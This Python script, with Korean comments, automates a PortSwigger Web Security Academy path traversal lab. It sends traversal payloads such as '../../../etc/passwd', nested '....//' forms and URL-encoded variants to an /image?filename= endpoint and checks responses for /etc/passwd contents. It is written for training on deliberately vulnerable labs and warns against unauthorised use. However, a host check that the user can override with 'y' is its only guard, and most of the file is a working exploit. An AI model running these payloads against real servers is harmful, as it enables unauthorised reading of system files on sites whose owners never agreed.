# -*- coding: utf-8 -*-
"""
PortSwigger Web Security Academy — Path Traversal 랩 학습용 스크립트

Burp 없이 같은 일을 자동화합니다:
  GET /image?filename=../../../etc/passwd

사용 예:
  python path_traversal_lab.py https://0a....web-security-academy.net/
  python path_traversal_lab.py https://0a....web-security-academy.net/ --session YOUR_COOKIE
  python path_traversal_lab.py https://0a....web-security-academy.net/ --payloads

주의:
  - 학습용(의도적으로 취약한 Academy 랩) 전용입니다.
  - 허가 없는 실제 사이트에 사용하지 마세요.
"""

from __future__ import annotations

import argparse
import re
import sys
from urllib.parse import quote, urljoin, urlparse

try:
    import requests
except ImportError:
    print("requests 가 필요합니다:  pip install requests")
    sys.exit(1)


# 기본 랩(가장 단순한 경우) + 비슷한 변형 몇 개 (다른 path traversal 랩용)
DEFAULT_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "....\\/....\\/....\\/etc/passwd",
]

PASSWD_HINT = re.compile(r"root:x:0:0:")


def normalize_base(url: str) -> str:
    url = url.strip()
    if not url.startswith("http"):
        url = "https://" + url
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"


def looks_like_academy(url: str) -> bool:
    host = urlparse(url).netloc.lower()
    return "web-security-academy.net" in host or "portswigger" in host


def build_session(cookie: str | None, proxy: str | None) -> requests.Session:
    s = requests.Session()
    s.headers.update(
        {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36"
            ),
            "Accept": "*/*",
        }
    )
    if cookie:
        # "session=abc" 또는 "abc" 둘 다 허용
        if "=" in cookie:
            s.headers["Cookie"] = cookie
        else:
            s.headers["Cookie"] = f"session={cookie}"
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
        s.verify = False  # Burp 프록시 쓸 때 편함
    return s


def try_payload(
    session: requests.Session,
    base: str,
    payload: str,
    encode: bool,
    timeout: float,
) -> tuple[int, str, bool]:
    """returns status_code, body_preview, success"""
    value = quote(payload, safe="") if encode else payload
    # 기본 랩은 보통 인코딩 없이 raw ../ 를 씀
    url = urljoin(base + "/", f"image?filename={value}")
    # quote 하면 전체 쿼리가 인코딩됨. raw 경로는 수동 조립이 더 낫다.
    if not encode:
        url = f"{base}/image?filename={payload}"

    r = session.get(url, timeout=timeout, allow_redirects=True)
    text = r.text if r.encoding or r.content else ""
    # 바이너리/이미지로 와도 텍스트로 디코드 시도
    if not text and r.content:
        text = r.content.decode("utf-8", errors="replace")
    ok = bool(PASSWD_HINT.search(text))
    return r.status_code, text, ok


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Academy Path Traversal 랩 — /image?filename= 자동화 (학습용)"
    )
    ap.add_argument(
        "lab_url",
        help="랩 URL (예: https://0a....web-security-academy.net/)",
    )
    ap.add_argument(
        "--session",
        "-s",
        default=None,
        help="session 쿠키 값 (없으면 쿠키 없이 시도)",
    )
    ap.add_argument(
        "--payload",
        "-p",
        default="../../../etc/passwd",
        help="filename 에 넣을 값 (기본: ../../../etc/passwd)",
    )
    ap.add_argument(
        "--payloads",
        action="store_true",
        help="여러 변형 payload 를 순서대로 시도",
    )
    ap.add_argument(
        "--encode",
        action="store_true",
        help="filename 값을 URL 인코딩해서 전송",
    )
    ap.add_argument(
        "--proxy",
        default=None,
        help="선택: Burp 등으로 보내기 (예: http://127.0.0.1:8080)",
    )
    ap.add_argument(
        "--timeout",
        type=float,
        default=15.0,
    )
    ap.add_argument(
        "--show-body",
        action="store_true",
        help="성공 시 본문 전체 출력",
    )
    args = ap.parse_args()

    base = normalize_base(args.lab_url)
    if not looks_like_academy(base):
        print(
            "[!] 경고: web-security-academy.net 호스트가 아닙니다.\n"
            "    이 스크립트는 PortSwigger 학습 랩 전용입니다.\n"
            "    허가 없는 사이트에는 사용하지 마세요.\n"
        )
        ans = input("그래도 계속할까요? [y/N] ").strip().lower()
        if ans not in ("y", "yes"):
            print("중단했습니다.")
            return 1

    session = build_session(args.session, args.proxy)
    payloads = DEFAULT_PAYLOADS if args.payloads else [args.payload]

    print(f"대상: {base}")
    print(f"엔드포인트: GET /image?filename=<payload>")
    print("-" * 60)

    any_ok = False
    for payload in payloads:
        try:
            status, body, ok = try_payload(
                session, base, payload, args.encode, args.timeout
            )
        except requests.RequestException as e:
            print(f"[FAIL] {payload!r}")
            print(f"       네트워크 오류: {e}")
            continue

        mark = "OK  " if ok else "----"
        print(f"[{mark}] status={status}  filename={payload!r}")
        if ok:
            any_ok = True
            # 앞부분만 미리보기
            preview = body.strip().splitlines()[:8]
            print("       /etc/passwd 내용이 응답에 포함되어 있습니다.")
            print("       --- preview ---")
            for line in preview:
                print(f"       {line}")
            print("       ---------------")
            if args.show_body:
                print(body)
            if not args.payloads:
                break

    print("-" * 60)
    if any_ok:
        print("결과: 성공 — 경로 탐색으로 /etc/passwd 를 읽었습니다.")
        print("랩 페이지를 새로고침하면 Solved / Congratulations 가 뜰 수 있습니다.")
        return 0

    print("결과: 실패 — passwd 패턴을 찾지 못했습니다.")
    print("힌트:")
    print("  1) 랩 URL 이 만료되면 새로 Access the lab 하세요.")
    print("  2) 브라우저에서 복사한 session 쿠키를 --session 으로 넣어 보세요.")
    print("  3) 다른 변형 랩이면:  python path_traversal_lab.py URL --payloads")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
